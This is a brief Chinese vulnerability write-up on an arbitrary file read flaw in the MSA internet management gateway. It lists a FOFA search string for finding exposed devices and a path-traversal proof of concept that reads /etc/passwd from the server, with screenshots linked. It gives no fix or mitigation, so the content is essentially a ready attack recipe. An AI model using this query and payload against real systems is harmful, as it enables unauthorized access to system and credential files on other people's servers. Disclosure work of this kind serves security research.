#  MSA-互联网管理网关-msa-任意文件下载漏洞   
骇客安全  骇客安全   2025-03-22 14:21  
  
# 漏洞描述  
  
MSA 互联网管理网关存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件  
  
## 漏洞影响  
```
MSA 互联网管理网关
```  
  
## FOFA  
```
"互联网管理网关"
```  
  
## 漏洞复现  
  
登录页面  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N5mbjCIxZ0IItsO4ibAl72pT0xEOy1pYkmGRiciayIbk461DAibFxO6vwosAjr2C0ticSA7OrZ04dHUNw/640?wx_fmt=png&from=appmsg "null")  
  
  
验证POC  
  
```
/msa/../../../../etc/passwd
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991N5mbjCIxZ0IItsO4ibAl72p06uUmibOeze7N3uRjyb1o62YkePeU1r2L4ibiaL34u6v81dqNuzsZ11sw/640?wx_fmt=png&from=appmsg "null")  
  
  
  
